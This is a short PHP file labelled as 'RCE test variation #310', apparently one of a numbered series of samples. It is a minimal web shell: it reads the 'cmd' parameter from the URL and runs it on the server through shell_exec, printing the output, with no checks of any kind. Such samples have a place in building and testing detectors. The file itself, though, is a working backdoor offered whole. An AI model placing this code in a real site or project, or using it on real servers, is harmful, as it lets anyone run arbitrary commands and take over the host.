<?php
// RCE test variation #310
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>